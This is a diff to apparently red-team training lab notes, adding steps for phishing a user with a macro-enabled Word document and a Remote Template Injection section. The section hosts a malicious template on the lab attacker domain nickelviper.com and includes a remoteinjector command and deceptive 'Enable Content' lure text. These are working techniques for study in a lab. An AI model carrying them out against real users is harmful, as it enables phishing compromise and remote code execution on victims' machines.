@@ -90,11 +90,28 @@ Docs containing macros are handled with more scrutiny. Create a macro in a Word 
   4. Local port: 80
   5. Mime type: automatic
 8. Open an HTML email template for Office 365 in a browser from https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master/Office365
-9. Copy the content and paste into the OWA text editor
-10. Change text/URL as appropriate, e.g. http://nickelviper.com/file.doc
-  
-  
-  
+9. Copy the content and paste into the OWA text editor (if you attach the document directly to the email it will not have MotW and won't open in Protected View)
+10. Change text/URL as appropriate, e.g. http://nickelviper.com/file.doc, and send email
+11. Log into Workstation 2 as Bob, launch Outlook, and the email will arrive.
+12. The file will still have the macro security warning; real phishing campaigns add text e.g. "Shoddy Security Suite has scanned the content and it is safe. To show file, click Enable Content".
+13. Once clicked, a PS window will open and close quickly
+14. A new beacon will appear in CS
 
-     
+## Remote Template Injection
+
+Using Word's ability to create a doc from a template, which may hold a macro that executes arbitrary code.
+
+1. Attacker Desktop: Open Word > New document
+2. Insert desired macro
+3. Save to C:\Payloads as Word 97-2003 Template (*.dot) file
+4. CS: host template at http://nickelviper.com/template.dot
+5. Word: create new document from the blank template at C:\Users\Attacker\Documents\Custom Office Templates
+6. Add some content and save it as C:\Payloads\<file>.docx.
+7. Explorer: right-click on file and select 7-Zip > Open archive
+8. Navigate to word > _rels, right-click on settings.xml.rels and select Edit
+9. Replace Target entry in the XML with "http://nickelviper.com/template.dot"
+10. Save those changes and email the document to Bob
+11. The file still gives a warning about macros but allowing them will execute the macro in the hosted template, creating a beacon in CS
+
+[remoteinjector](https://github.com/JohnWoodman/remoteinjector) automates this process: ```python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx```
 
